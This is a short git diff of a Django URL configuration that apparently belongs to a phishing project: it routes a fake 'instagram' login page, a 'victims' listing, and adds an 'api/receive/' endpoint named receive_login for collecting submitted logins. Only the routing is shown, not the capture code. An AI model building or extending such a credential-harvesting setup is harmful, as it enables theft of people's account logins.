@@ -18,11 +18,12 @@ from django.contrib import admin
 from django.urls import path
 from instagram.views import login_view
 from home.views import home
-from victims.views import victims
+from victims.views import victims, receive_login
 
 urlpatterns = [
     path('admin/', admin.site.urls),
     path('instagram/', login_view, name='login'),
-    path('home/', home, name='home'),
     path('victims/', victims, name='victims'),
+    path('api/receive/', receive_login, name='receive_login'),
+    path('home/', home, name='home'),
 ]
